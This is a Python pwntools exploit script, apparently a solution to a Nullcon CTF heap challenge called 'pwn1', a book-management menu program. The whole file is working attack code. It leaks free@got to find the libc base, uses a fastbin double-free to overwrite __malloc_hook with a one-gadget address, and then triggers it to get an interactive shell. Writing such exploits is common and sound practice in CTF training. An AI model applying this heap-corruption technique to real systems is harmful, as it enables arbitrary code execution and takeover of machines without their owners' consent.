from pwn import *
# remote
# p=remote("pwn.ctf.nullcon.net",4002)
# libc=ELF("/home/pwn/libc/libc-database/db/libc6_2.27-3ubuntu1_amd64.so")
# elf=ELF("./pwn1")
# local
# context.log_level='debug'
p=process("./pwn1")
elf=ELF("./pwn1")
libc=elf.libc


def my_add(size,name,price):
    p.sendlineafter("> ","1")
    p.sendlineafter("Book name length: ",str(size))
    p.sendafter("Book name: ",name)
    p.sendlineafter("Book price: ",str(price))

def delete(idx):
    p.sendlineafter("> ","2")
    p.sendlineafter("Book index: ",str(idx))

def show():
    p.sendlineafter("> ","3")

my_add(0x50,"aaaa",1) # 0 # 0
my_add(0x50,"bbbb",2) # 1 # 1
my_add(0x50,"cccc",3) # 2 # 2
delete(0)             # 1
delete(1) 			  # 0
payload=p64(0)+p64(elf.got["free"]) # 0's name_addr => free@got
my_add(0x38,payload,4)# 1 # Lifo # control 0's 0x38 # 3
show()

p.recvuntil("\"name\": \"")
free_addr=u64(p.recvuntil("\"")[:-1].ljust(8,'\x00'))
print "free_addr->"+hex(free_addr) 
libc_base = free_addr-libc.symbols["free"]

print(hex(libc_base))
hook=libc_base+libc.symbols["__malloc_hook"]


gadget=libc_base+0xf02a4
#0x4f2c5 0x4f322 0x10a38c
# print "gadget>"+hex(gadget)

# # fastbin dupa

my_add(0x60,"dddd",5) # 2 # 4
my_add(0x60,"eeee",6) # 3 # 5 
my_add(0x60,"eeee",7) # 4 # 6
# padding
my_add(0x60,"eeee",7) # 5 # 7
my_add(0x60,"eeee",7) # 6 # 8
my_add(0x60,"eeee",7) # 7 # 8


delete(4) # 7 > 4
delete(5) # 6 > 5
delete(4) # 5 > 4

my_add(0x60 , p64(hook-0x23) , 8)
delete(2)
my_add(0x60 , "temp\n" , 10 )
my_add(0x60 , "temp\n" , 11)
my_add(0x60 , "a" * 0x13 + p64(gadget) , 11)

delete(2)
delete(2)
p.interactive()
